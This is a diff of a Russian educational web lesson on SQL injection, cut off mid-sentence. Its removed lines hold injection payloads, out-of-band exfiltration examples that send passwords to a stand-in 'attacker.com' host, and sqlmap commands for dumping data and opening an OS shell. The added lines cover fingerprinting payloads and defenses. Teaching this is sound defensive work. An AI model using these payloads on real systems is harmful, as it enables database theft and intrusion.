@@ -3,7 +3,7 @@
 import React from 'react';
 import { ContentPageLayout } from '@/components/content/ContentPageLayout';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
-import { ExternalLink, AlertTriangle } from 'lucide-react';
+import { ExternalLink } from 'lucide-react';
 import { QuizItem } from '@/components/content/QuizItem';
 
 const P: React.FC<React.HTMLAttributes<HTMLParagraphElement>> = ({ children, ...props }) => (
@@ -108,563 +108,557 @@ export default function Lesson4Page() {
       subtitle="Подробное изучение атак SQL Injection, типов, методов эксплуатации и защиты"
     >
       <div className="space-y-6">
-        <Card className="border-destructive/50 bg-destructive/5">
-          <CardHeader>
-            <CardTitle className="flex items-center gap-2">
-              <AlertTriangle className="h-5 w-5 text-destructive" />
-              Важное предупреждение
-            </CardTitle>
-          </CardHeader>
-          <CardContent>
-            <P>
-              SQL Injection — одна из самых опасных и распространенных уязвимостей веб-приложений. 
-              Она может привести к полной компрометации базы данных и всего приложения. 
-              Все примеры в этом уроке предназначены только для образовательных целей в контролируемых средах.
+        <Card className="border-primary/20 bg-primary/5">
+          <CardContent className="pt-6">
+            <P className="text-sm">
+              <strong>Источник материала:</strong> Данный урок основан на материалах из{' '}
+              <a 
+                href="https://innowise-group.atlassian.net/wiki/spaces/QD/pages/4038983727/SQL+Injection" 
+                target="_blank" 
+                rel="noopener noreferrer"
+                className="text-primary hover:underline inline-flex items-center"
+              >
+                Confluence (Innowise Group) <ExternalLink className="ml-1 h-3 w-3" />
+              </a>
             </P>
           </CardContent>
         </Card>
 
         <Card>
           <CardHeader>
-            <CardTitle>Что такое SQL Injection?</CardTitle>
-          </CardHeader>
-          <CardContent className="space-y-4">
-            <P>
-              <strong>SQL Injection (SQLi)</strong> — это уязвимость безопасности веб-приложений, которая позволяет 
-              злоумышленнику внедрять вредоносный SQL-код в запросы к базе данных. Это происходит, когда пользовательский 
-              ввод неправильно фильтруется или экранируется перед использованием в SQL-запросе.
-            </P>
-            <P>
-              Успешная SQL Injection атака может позволить злоумышленнику:
-            </P>
-            <ul className="list-disc pl-6 mb-3 space-y-1">
-              <li>Читать конфиденциальные данные из базы данных</li>
-              <li>Изменять данные (вставка, обновление, удаление)</li>
-              <li>Выполнять административные операции с БД</li>
-              <li>Восстанавливать содержимое файлов в СУБД</li>
-              <li>В некоторых случаях выполнять команды на уровне операционной системы</li>
-            </ul>
-          </CardContent>
-        </Card>
-
-        <Card>
-          <CardHeader>
-            <CardTitle>5 главных причин SQL Injection</CardTitle>
+            <CardTitle>Теория</CardTitle>
           </CardHeader>
           <CardContent className="space-y-4">
-            <div>
-              <H3>1. Недостаточная валидация входных данных</H3>
-              <P>
-                Приложение не проверяет и не санитизирует данные, полученные от пользователя, перед их использованием в SQL-запросе.
-              </P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`// Уязвимый код (PHP)
-$id = $_GET['id'];
-$query = "SELECT * FROM users WHERE id = $id";
-$result = mysqli_query($conn, $query);
-
-// Атака: ?id=1 OR 1=1
-// Запрос: SELECT * FROM users WHERE id = 1 OR 1=1`}
-                </pre>
-              </div>
-            </div>
-
-            <div>
-              <H3>2. Динамическое построение SQL-запросов</H3>
-              <P>
-                Использование конкатенации строк для создания SQL-запросов вместо параметризованных запросов.
-              </P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`// Уязвимый код (Python)
-username = request.form['username']
-password = request.form['password']
-query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
-cursor.execute(query)
-
-// Атака: username = admin'--
-// Запрос: SELECT * FROM users WHERE username='admin'--' AND password='...'`}
-                </pre>
-              </div>
-            </div>
-
-            <div>
-              <H3>3. Использование привилегированных учетных записей БД</H3>
-              <P>
-                Приложение подключается к базе данных с учетной записью, имеющей избыточные права (например, root или sa).
-              </P>
-              <ul className="list-disc pl-6 mb-3 space-y-1">
-                <li>Увеличивается урон при успешной атаке</li>
-                <li>Возможность выполнения административных команд</li>
-                <li>Доступ к системным таблицам и процедурам</li>
-              </ul>
-            </div>
-
-            <div>
-              <H3>4. Отображение подробных сообщений об ошибках</H3>
-              <P>
-                Вывод детальных ошибок базы данных пользователю помогает злоумышленникам понять структуру БД.
-              </P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`// Пример ошибки, помогающей атакующему:
-You have an error in your SQL syntax; check the manual that corresponds to your 
-MySQL server version for the right syntax to use near ''admin''' at line 1
-
-// Злоумышленник узнает:
-- Используется MySQL
-- Синтаксис запроса
-- Точка внедрения кода`}
-                </pre>
-              </div>
-            </div>
-
-            <div>
-              <H3>5. Отсутствие дополнительных уровней защиты</H3>
-              <P>
-                Нет Web Application Firewall (WAF), системы обнаружения вторжений (IDS) или других механизмов защиты.
-              </P>
-              <ul className="list-disc pl-6 mb-3 space-y-1">
-                <li>Отсутствие мониторинга подозрительных запросов</li>
-                <li>Нет ограничения частоты запросов (rate limiting)</li>
-                <li>Отсутствие логирования подозрительной активности</li>
-              </ul>
-            </div>
+            <H3>Что такое SQL-инъекция?</H3>
+            <P>
+              Это одна из самых опасных уязвимостей веб-приложений. Она позволяет злоумышленнику выполнять запросы 
+              к базе данных сайта, а в некоторых случаях — записывать/читать данные в файловую систему с правами 
+              сервера базы данных, изменять записи в таблицах и даже полностью удалять базу данных. Проще говоря, 
+              SQL-инъекция — это атака на базу данных, которая позволяет выполнить действие, не запланированное её создателем.
+            </P>
           </CardContent>
         </Card>
 
         <Card>
           <CardHeader>
-            <CardTitle>Типы SQL Injection</CardTitle>
+            <CardTitle>Пять основных причин SQL-инъекции</CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <ol className="list-decimal pl-6 space-y-2">
+              <li>Динамическое построение SQL-запросов</li>
+              <li>Некорректная обработка исключений</li>
+              <li>Некорректная обработка специальных символов</li>
+              <li>Некорректная обработка типов данных</li>
+              <li>Небезопасная конфигурация СУБД</li>
+            </ol>
+          </CardContent>
+        </Card>
+
+        <Card>
+          <CardHeader>
+            <CardTitle>Основные виды SQL Injection</CardTitle>
           </CardHeader>
           <CardContent className="space-y-6">
             <div>
-              <H2>1. In-band SQL Injection</H2>
+              <H3>1. Внутриканальные (In-band)</H3>
               <P>
-                <strong>In-band SQLi</strong> — самый распространенный тип, где злоумышленник использует тот же 
-                канал связи для запуска атаки и сбора результатов.
+                Результат приходит в ответе тем же каналом (один запрос – один ответ):
               </P>
-
-              <H3>1.1 Error-based SQL Injection</H3>
-              <P>
-                Использует сообщения об ошибках СУБД для получения информации о структуре базы данных.
-              </P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`// Пример атаки:
-?id=1' AND (SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT version()), 
-0x23, FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) y)--
-
-// Получаем версию MySQL через сообщение об ошибке`}
-                </pre>
-              </div>
-
-              <H3>1.2 Union-based SQL Injection</H3>
-              <P>
-                Использует оператор UNION для объединения результатов вредоносного запроса с легитимным.
-              </P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`// Определение количества столбцов:
-?id=1' ORDER BY 1--
-?id=1' ORDER BY 2--
-?id=1' ORDER BY 3--  (ошибка = 2 столбца)
-
-// Получение данных:
-?id=1' UNION SELECT username, password FROM users--
-
-// Результат может содержать данные из таблицы users`}
-                </pre>
-              </div>
-            </div>
-
-            <div>
-              <H2>2. Inferential SQL Injection (Blind SQLi)</H2>
-              <P>
-                <strong>Blind SQL Injection</strong> происходит, когда приложение уязвимо, но HTTP-ответы не содержат 
-                результатов SQL-запроса или ошибок базы данных.
-              </P>
-
-              <H3>2.1 Boolean-based Blind SQL Injection</H3>
-              <P>
-                Отправка SQL-запросов, которые заставляют приложение возвращать разные результаты в зависимости от того, 
-                является ли запрос TRUE или FALSE.
-              </P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`// Проверка существования таблицы:
-?id=1' AND (SELECT COUNT(*) FROM users) > 0--  (страница загружается нормально = TRUE)
-?id=1' AND (SELECT COUNT(*) FROM admins) > 0--  (ошибка или пустая страница = FALSE)
-
-// Извлечение данных по одному биту:
-?id=1' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a'--
-?id=1' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'b'--`}
-                </pre>
-              </div>
-
-              <H3>2.2 Time-based Blind SQL Injection</H3>
-              <P>
-                Отправка SQL-запросов, которые заставляют базу данных ждать определенное время перед ответом.
-              </P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`// MySQL:
-?id=1' AND IF(1=1, SLEEP(5), 0)--  (задержка 5 секунд = TRUE)
-?id=1' AND IF(1=2, SLEEP(5), 0)--  (нет задержки = FALSE)
-
-// SQL Server:
-?id=1'; IF (1=1) WAITFOR DELAY '00:00:05'--
-
-// PostgreSQL:
-?id=1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
-
-// Извлечение данных:
-?id=1' AND IF((SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a', SLEEP(5), 0)--`}
-                </pre>
-              </div>
-            </div>
-
-            <div>
-              <H2>3. Out-of-band SQL Injection</H2>
-              <P>
-                <strong>Out-of-band SQLi</strong> используется, когда злоумышленник не может использовать тот же канал 
-                для запуска атаки и сбора результатов. Данные извлекаются по альтернативному каналу (DNS, HTTP).
-              </P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`// Microsoft SQL Server (xp_dirtree для DNS lookup):
-?id=1'; DECLARE @data VARCHAR(1024); SELECT @data = (SELECT password FROM users WHERE username='admin'); 
-EXEC('master..xp_dirtree "\\\\' + @data + '.attacker.com\\a"')--
-
-// Oracle (UTL_HTTP для HTTP запроса):
-?id=1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT password FROM users WHERE username='admin')) FROM dual--
-
-// MySQL (LOAD_FILE для чтения DNS):
-?id=1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\\\a'))--`}
-                </pre>
-              </div>
-              <P>
-                Злоумышленник контролирует attacker.com и получает данные через DNS-запросы или HTTP-логи.
-              </P>
-            </div>
-
-            <div>
-              <H2>4. Second-order SQL Injection</H2>
-              <P>
-                <strong>Second-order SQLi</strong> происходит, когда вредоносные данные сначала сохраняются приложением, 
-                а затем используются в другом SQL-запросе без должной обработки.
-              </P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`// Шаг 1: Регистрация пользователя с именем:
-username: admin'--
-
-// Код приложения (использует prepared statement):
-INSERT INTO users (username, password) VALUES (?, ?)
-// Данные сохраняются безопасно: username = "admin'--"
-
-// Шаг 2: Обновление профиля (уязвимый код):
-$username = $_SESSION['username'];  // "admin'--"
-$query = "UPDATE users SET email='$email' WHERE username='$username'";
-// Запрос становится:
-UPDATE users SET email='test@test.com' WHERE username='admin'--'
-
-// Результат: обновляется email всех пользователей с username='admin'`}
-                </pre>
-              </div>
-              <P>
-                <strong>Характеристики Second-order SQLi:</strong>
-              </P>
-              <ul className="list-disc pl-6 mb-3 space-y-1">
-                <li>Труднее обнаружить, так как внедрение и эксплуатация разделены</li>
-                <li>Может обходить некоторые WAF и системы защиты</li>
-                <li>Требует понимания логики приложения</li>
-                <li>Часто встречается в функциях обновления профиля, комментариев, административных панелях</li>
+              <ul className="list-disc pl-6 mb-3 space-y-2">
+                <li>
+                  <strong>Error-based</strong> – В случае этой атаки сканер заменяет или добавляет в уязвимый параметр 
+                  синтаксически неправильное выражение, после чего парсит HTTP-ответ (заголовки и тело) в поиске ошибок DBMS, 
+                  в которых содержалась бы заранее известная инъецированная последовательность символов и где-то "рядом" вывод 
+                  на интересующий нас подзапрос. Эта техника работает только тогда, когда веб-приложение по каким-то причинам 
+                  (чаще всего в целях отладки) раскрывает ошибки DBMS.
+                </li>
+                <li>
+                  <strong>Union-based</strong> – через <code className="bg-muted px-1 py-0.5 rounded">UNION SELECT</code> оператор — 
+                  вставляем свои колонки, получаем данные и т.д.
+                </li>
               </ul>
+            </div>
+
+            <div>
+              <H3>2. Инференциальная или дедуктивная (Inferential)</H3>
+              <P>
+                Результат не возвращается напрямую:
+              </P>
+              <ul className="list-disc pl-6 mb-3 space-y-2">
+                <li>
+                  <strong>Boolean-based</strong> — запрос возвращает true/false; мы отличаем по содержимому страницы. 
+                  Например страница логинки, если креды совпадают, то тело ответа – <code className="bg-muted px-1 py-0.5 rounded">1</code>. 
+                  Если нет – <code className="bg-muted px-1 py-0.5 rounded">0</code>. Подставляем математический оператор{' '}
+                  <code className="bg-muted px-1 py-0.5 rounded">AND 1=0</code> c правильными кредами – в ответе будет{' '}
+                  <code className="bg-muted px-1 py-0.5 rounded">0</code>. Потому что, <code className="bg-muted px-1 py-0.5 rounded">1</code> не 
+                  может равняться <code className="bg-muted px-1 py-0.5 rounded">0</code>. И наоборот.
+                </li>
+                <li>
+                  <strong>Time-based</strong> — вызываем <code className="bg-muted px-1 py-0.5 rounded">SLEEP(10)</code> /{' '}
+                  <code className="bg-muted px-1 py-0.5 rounded">pg_sleep(10)</code> (<em>в зависимости от типа БД свои операторы</em>) 
+                  и измеряем задержку ответа (<em>в Repeater внизу справа</em>). То есть, вставили пейлоад, поставили задержку 
+                  на <code className="bg-muted px-1 py-0.5 rounded">10 секунд</code> – сервер отвечает на наш запрос{' '}
+                  <code className="bg-muted px-1 py-0.5 rounded">10 секунд</code>.
+                </li>
+              </ul>
+            </div>
+
+            <div>
+              <H3>3. Out-of-band (OOB)</H3>
+              <P>
+                БД сам инициирует соединение к внешнему ресурсу <strong>(DNS/HTTP)</strong>. Сложный вид атаки и очень редко 
+                встречающийся в реальной жизни. Но на PortSwigger есть несколько задач.
+              </P>
+            </div>
+
+            <div>
+              <H3>4. Second-order</H3>
+              <P>
+                Полезная нагрузка сохраняется в БД и выполняется позже в другом контексте. Например загружаем файл с <strong>SQL Payload</strong>, 
+                а потом мы или кто-то другой его вызывает и он выполняется. Как в примере с <strong>XSS</strong> в{' '}
+                <strong>svg</strong> файле в конце статьи.
+              </P>
             </div>
           </CardContent>
         </Card>
 
         <Card>
           <CardHeader>
-            <CardTitle>Инструменты: sqlmap</CardTitle>
+            <CardTitle>Процесс эксплуатации SQL инъекции</CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <ol className="list-decimal pl-6 space-y-2">
+              <li>Выявление SQL-инъекции;</li>
+              <li>Определения типа и версии СУБД;</li>
+              <li>Определения имени пользователя и его привилегий;</li>
+              <li>Повышения привилегий;</li>
+              <li>Эксплуатации уязвимости.</li>
+            </ol>
+            <P>
+              Мы разберемся в первых двух пунктах, они необходимы для того чтобы доказать факт наличия уязвимости. 
+              На текущем этапе этого достаточно для заведения баг репорта.
+            </P>
+          </CardContent>
+        </Card>
+
+        <Card>
+          <CardHeader>
+            <CardTitle>Определение типа и версии СУБД</CardTitle>
           </CardHeader>
           <CardContent className="space-y-4">
             <P>
-              <strong>sqlmap</strong> — мощный инструмент с открытым исходным кодом для автоматизации обнаружения и 
-              эксплуатации SQL Injection уязвимостей.
+              Без знания типа и версии СУБД невозможно эксплуатировать SQL-инъекцию и корректно сформировать запрос, 
+              который вернет нужную информацию из БД. Это очень важно, не закрытая <code className="bg-muted px-1 py-0.5 rounded">"</code> или{' '}
+              <code className="bg-muted px-1 py-0.5 rounded">+</code> не в том месте, может повлиять на интерпритатор и как это будет выполненно или не выполненно БД.
             </P>
-
-            <H3>Установка</H3>
-            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-              <pre className="text-sm">
-{`# Linux/Mac:
-git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
-cd sqlmap-dev
-python sqlmap.py
-
-# Или через pip:
-pip install sqlmap
-
-# Или через apt (Kali Linux):
-sudo apt install sqlmap`}
-              </pre>
-            </div>
-
-            <H3>Основные команды</H3>
-            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-              <pre className="text-sm">
-{`# Базовое сканирование URL:
-sqlmap -u "http://example.com/page?id=1"
-
-# Тестирование с POST данными:
-sqlmap -u "http://example.com/login" --data="username=admin&password=pass"
-
-# Использование cookie:
-sqlmap -u "http://example.com/profile" --cookie="PHPSESSID=abc123"
-
-# Перечисление баз данных:
-sqlmap -u "http://example.com/page?id=1" --dbs
-
-# Перечисление таблиц в базе данных:
-sqlmap -u "http://example.com/page?id=1" -D database_name --tables
-
-# Перечисление столбцов в таблице:
-sqlmap -u "http://example.com/page?id=1" -D database_name -T users --columns
-
-# Извлечение данных:
-sqlmap -u "http://example.com/page?id=1" -D database_name -T users -C username,password --dump
-
-# Автоматический режим (batch):
-sqlmap -u "http://example.com/page?id=1" --batch
-
-# Использование уровня и риска:
-sqlmap -u "http://example.com/page?id=1" --level=5 --risk=3
-
-# Определение СУБД:
-sqlmap -u "http://example.com/page?id=1" --banner
-
-# Получение shell:
-sqlmap -u "http://example.com/page?id=1" --os-shell`}
-              </pre>
-            </div>
-
-            <H3>Опции уровня и риска</H3>
-            <ul className="list-disc pl-6 mb-3 space-y-2">
-              <li><strong>--level (1-5)</strong>: Количество тестов (1 = базовые, 5 = все возможные)</li>
-              <li><strong>--risk (1-3)</strong>: Риск изменения данных (1 = безопасные, 3 = UPDATE/DELETE запросы)</li>
-            </ul>
-
-            <H3>Использование с Burp Suite</H3>
-            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-              <pre className="text-sm">
-{`# 1. Перехватите запрос в Burp
-# 2. Сохраните запрос в файл (например, request.txt)
-# 3. Используйте sqlmap:
-sqlmap -r request.txt --batch --dbs
-
-# Пример файла request.txt:
-POST /login HTTP/1.1
-Host: example.com
-Content-Type: application/x-www-form-urlencoded
-
-username=admin&password=123456`}
-              </pre>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card>
-          <CardHeader>
-            <CardTitle>Методы защиты от SQL Injection</CardTitle>
-          </CardHeader>
-          <CardContent className="space-y-4">
-            <div>
-              <H3>1. Prepared Statements (Параметризованные запросы)</H3>
-              <P><strong>Самый эффективный метод защиты</strong></P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`// PHP (PDO):
-$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
-$stmt->execute([$username, $password]);
-
-// Python (psycopg2):
-cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
-
-// Java (JDBC):
-String query = "SELECT * FROM users WHERE username = ? AND password = ?";
-PreparedStatement pstmt = connection.prepareStatement(query);
-pstmt.setString(1, username);
-pstmt.setString(2, password);
-ResultSet rs = pstmt.executeQuery();
-
-// Node.js (mysql2):
-connection.execute("SELECT * FROM users WHERE username = ? AND password = ?", [username, password])`}
-                </pre>
-              </div>
-            </div>
-
-            <div>
-              <H3>2. Stored Procedures (Хранимые процедуры)</H3>
-              <P>Безопасны только если не используют динамический SQL</P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`-- Создание безопасной stored procedure (SQL Server):
-CREATE PROCEDURE GetUser
-    @username VARCHAR(50),
-    @password VARCHAR(50)
-AS
-BEGIN
-    SELECT * FROM users WHERE username = @username AND password = @password
-END
-
-// Вызов из приложения (C#):
-SqlCommand cmd = new SqlCommand("GetUser", connection);
-cmd.CommandType = CommandType.StoredProcedure;
-cmd.Parameters.AddWithValue("@username", username);
-cmd.Parameters.AddWithValue("@password", password);`}
-                </pre>
-              </div>
-            </div>
-
-            <div>
-              <H3>3. Белый список входных данных (Input Validation)</H3>
-              <P>Валидация и санитизация пользовательского ввода</P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`// Пример валидации (PHP):
-// Только цифры для ID:
-if (!ctype_digit($id)) {
-    die("Invalid ID");
-}
-
-// Белый список для сортировки:
-$allowed_columns = ['name', 'email', 'created_at'];
-if (!in_array($sort_by, $allowed_columns)) {
-    $sort_by = 'name';
-}
-
-// Регулярные выражения для email:
-if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-    die("Invalid email");
-}`}
-                </pre>
-              </div>
-            </div>
-
-            <div>
-              <H3>4. Экранирование специальных символов</H3>
-              <P>Последняя линия защиты (не основная!)</P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`// PHP:
-$username = mysqli_real_escape_string($conn, $_POST['username']);
-
-// Python (обратите внимание: не рекомендуется, используйте параметризованные запросы):
-username = pymysql.escape_string(username)
-
-// Важно: экранирование НЕ заменяет параметризованные запросы!`}
-                </pre>
-              </div>
-            </div>
-
-            <div>
-              <H3>5. Принцип наименьших привилегий</H3>
-              <ul className="list-disc pl-6 mb-3 space-y-1">
-                <li>Приложение должно подключаться к БД с минимальными необходимыми правами</li>
-                <li>Отдельные учетные записи для чтения и записи</li>
-                <li>Запрет прямого доступа к системным таблицам</li>
-                <li>Отключение опасных функций (xp_cmdshell, LOAD_FILE и т.д.)</li>
-              </ul>
-            </div>
-
-            <div>
-              <H3>6. Web Application Firewall (WAF)</H3>
-              <P>Дополнительный уровень защиты:</P>
-              <ul className="list-disc pl-6 mb-3 space-y-1">
-                <li>ModSecurity (open source)</li>
-                <li>Cloudflare WAF</li>
-                <li>AWS WAF</li>
-                <li>Imperva WAF</li>
-              </ul>
-            </div>
-
-            <div>
-              <H3>7. Мониторинг и логирование</H3>
-              <ul className="list-disc pl-6 mb-3 space-y-1">
-                <li>Логирование всех SQL-запросов</li>
-                <li>Мониторинг подозрительных паттернов (UNION, OR 1=1, SLEEP())</li>
-                <li>Настройка алертов на аномальную активность БД</li>
-                <li>Регулярные аудиты безопасности</li>
-              </ul>
-            </div>
-
-            <div>
-              <H3>8. Отключение детальных сообщений об ошибках</H3>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`// Production настройки (PHP):
-ini_set('display_errors', 0);
-error_reporting(0);
-
-// Показывать общие сообщения:
-try {
-    // SQL запрос
-} catch (Exception $e) {
-    // Логировать ошибку в файл
-    error_log($e->getMessage());
-    // Показать пользователю:
-    die("An error occurred. Please try again later.");
-}`}
-                </pre>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card>
-          <CardHeader>
-            <CardTitle>Практические лаборатории</CardTitle>
-          </CardHeader>
-          <CardContent className="space-y-4">
             <P>
-              Рекомендуемые платформы для практики SQL Injection:
+              Первое, что необходимо сделать – определить используемую для построения web-приложения инфраструктуру и технологию. 
+              Например, если применяется технология <strong>ASP.Net</strong> и <strong>IIS</strong>, то, скорее всего, 
+              в качестве СУБД используется <strong>Microsoft SQL Server</strong>. Конечно, полностью полагаться на данную информацию нельзя.
             </P>
-            <ul className="list-disc pl-6 space-y-2">
+            <P>
+              Если web-приложение выводит сообщение о возникшем исключении при работе с СУБД, можно легко определить тип СУБД. 
+              Сообщение об ошибке, начинающееся со слова <code className="bg-muted px-1 py-0.5 rounded">ORA</code>, говорит об 
+              использовании <strong>СУБД Oracle</strong>.
+            </P>
+            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
+              <pre className="text-sm">
+{`ORA01773: may not specify column datatypes in this CREATE TABLE`}
+              </pre>
+            </div>
+            <P>
+              Поскольку каждая СУБД по разному обрабатывает конкатенацию строк, по этому признаку можно судить о типе СУБД.
+            </P>
+
+            <H3>Способ 1:</H3>
+            <P>
+              Тип БД можно определить по сообщениям об ошибке разные БД имеют разные сообщения об ошибках:
+            </P>
+            <ol className="list-decimal pl-6 space-y-2">
               <li>
-                <strong>PortSwigger Web Security Academy - SQL Injection</strong>
+                <strong>Ожидаемый результат для MySQL:</strong>
+                <div className="bg-muted p-4 rounded-md mt-2 overflow-x-auto">
+                  <pre className="text-sm">
+{`Query failed: You have an error in your SQL syntax; check the manual that 
+corresponds to your MySQL server version for the right syntax to use near '' at line 1`}
+                  </pre>
+                </div>
+              </li>
+              <li>
+                <strong>Ожидаемый результат для Oracle:</strong>
+                <div className="bg-muted p-4 rounded-md mt-2 overflow-x-auto">
+                  <pre className="text-sm">
+{`ORA-00933: SQL command not properly ended`}
+                  </pre>
+                </div>
+              </li>
+              <li>
+                <strong>Ожидаемый результат для MS SQL Server:</strong>
+                <div className="bg-muted p-4 rounded-md mt-2 overflow-x-auto">
+                  <pre className="text-sm">
+{`Microsoft SQL Native Client error '80040e14' Unclosed quotation mark after the character string`}
+                  </pre>
+                </div>
+              </li>
+              <li>
+                <strong>Ожидаемый результат для PostgreSQL:</strong>
+                <div className="bg-muted p-4 rounded-md mt-2 overflow-x-auto">
+                  <pre className="text-sm">
+{`Query failed: ERROR: syntax error at or near "'" at character 56 in /www/site/test.php on line 121`}
+                  </pre>
+                </div>
+              </li>
+            </ol>
+
+            <div className="bg-amber-50 dark:bg-amber-950/20 border border-amber-200 dark:border-amber-800 rounded-md p-4 mt-4">
+              <P className="text-sm mb-2">
+                <strong>Важно:</strong> если ошибку не выдало — могут быть следующие причины:
+              </P>
+              <ol className="list-decimal pl-6 text-sm">
+                <li>
+                  SQL инъекции здесь нет — Фильтруются кавычки, или просто стоит преобразование в (int)
+                </li>
+                <li>
+                  Отключен вывод ошибок. Узнаем у разработчиков отключали ли они вывод ошибок или тестируем через Blind SQL
+                </li>
+              </ol>
+            </div>
+
+            <H3>Способ 2:</H3>
+            <P>
+              Можем попробовать запросить у базы данных информацию о ее версии. Эти команды встроены в базу данных, 
+              поэтому зачастую это самый простой путь для идентификации. Вот пейлоады:
+            </P>
+            <ul className="list-none pl-0 space-y-1">
+              <li><strong>MySQL:</strong> <code className="bg-muted px-1 py-0.5 rounded">SELECT version()</code></li>
+              <li><strong>MS SQL:</strong> <code className="bg-muted px-1 py-0.5 rounded">SELECT @@version</code></li>
+              <li><strong>PostgreSQL:</strong> <code className="bg-muted px-1 py-0.5 rounded">SELECT version()</code></li>
+              <li><strong>Oracle:</strong> <code className="bg-muted px-1 py-0.5 rounded">SELECT version FROM v$instance</code> or <code className="bg-muted px-1 py-0.5 rounded">SELECT FROM PRODUCT_COMPONENT_VERSION</code></li>
+            </ul>
+            <P><strong>Пример:</strong></P>
+            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
+              <pre className="text-sm">
+{`http://www.exampleurl.com/product.php?id=4 UNION SELECT version()`}
+              </pre>
+            </div>
+          </CardContent>
+        </Card>
+
+        <Card>
+          <CardHeader>
+            <CardTitle>Способы поиска уязвимости</CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <P>
+              Первым шагом в процессе выявления SQL-инъекции является определение способов передачи данных в web-приложение:
+            </P>
+            <ol className="list-decimal pl-6 space-y-2">
+              <li>Параметров, передаваемых при помощи <strong>GET/POST</strong> и реже <strong>PUT/PATCH</strong>-методов;</li>
+              <li>Значений, содержащихся в <strong>Cookie</strong>;</li>
+              <li>Параметров HTTP-заголовка (таких как <strong>Referer</strong> и <strong>UserAgent</strong>).</li>
+            </ol>
+            <P>
+              После определения входных параметров необходимо определить корректность обработки их web-приложением. 
+              Модифицируя входные параметры, необходимо добиться возникновения исключения в web-приложении, результатом 
+              которого будет сообщение о возникшем исключении либо некорректно отображенная страница или ответ, содержащий 
+              неполные (избыточные) данные. То есть, добавляем кавычки {'→'} отправляем запрос {'→'} смотрим ответ.
+            </P>
+          </CardContent>
+        </Card>
+
+        <Card>
+          <CardHeader>
+            <CardTitle>Способы защиты</CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <ol className="list-decimal pl-6 space-y-3">
+              <li>
+                <strong>Используйте безопасный API, исключающий применение интерпретатора или предоставляющий 
+                параметризованный интерфейс, либо используйте инструменты объектно-реляционного отображения (ORM)</strong>.
+                <P className="text-sm mt-2">
+                  <em>Примечание:</em> даже параметризованные хранимые процедуры могут привести к SQL-внедрениям, если PL/SQL или T-SQL 
+                  позволяют присоединять запросы и данные или выполнять вредоносный код с помощью EXECUTE IMMEDIATE или exec().
+                </P>
+              </li>
+              <li>
+                <strong>Реализуйте на сервере белые списки для проверки входных данных</strong>. Это, конечно, не обеспечит полную защиту, 
+                поскольку многие приложения используют спецсимволы, например, в текстовых областях или API для мобильных приложений.
+              </li>
+              <li>
+                Для остальных динамических запросов <strong>реализуйте экранирование спецсимволов</strong>, используя соответствующий 
+                интерпретатору синтаксис.
+                <P className="text-sm mt-2">
+                  <em>Примечание:</em> элементы SQL-структуры, такие как названия таблиц или столбцов, нельзя экранировать, поэтому 
+                  предоставляемые пользователями названия представляют опасность. Это обычная проблема программ для составления отчетов.
+                </P>
+              </li>
+              <li>
+                <strong>Используйте в запросах LIMIT</strong> или другие элементы управления SQL для предотвращения утечек данных.
+              </li>
+              <li>
+                Наиболее надежным способом предотвращения SQL-инъекций является <strong>использование параметризированных SQL-параметров</strong>. 
+                К примеру, в случае с PHP это возможно с помощью пакета PEAR's DB, предлагающего интерфейс для выполнения абсолютно 
+                безопасных SQL-выражений. Обращение к БД происходит следующим образом:{' '}
+                <code className="bg-muted px-1 py-0.5 rounded">$p = $db-&gt;prepare("SELECT * FROM users WHERE id = ?"); $db-execute($p, array($_GET['id']))</code>. 
+                Основная идея заключается в том, что если позиция параметров явно задана, то можно абсолютно безопасно передавать SQL-запросы базе данных, 
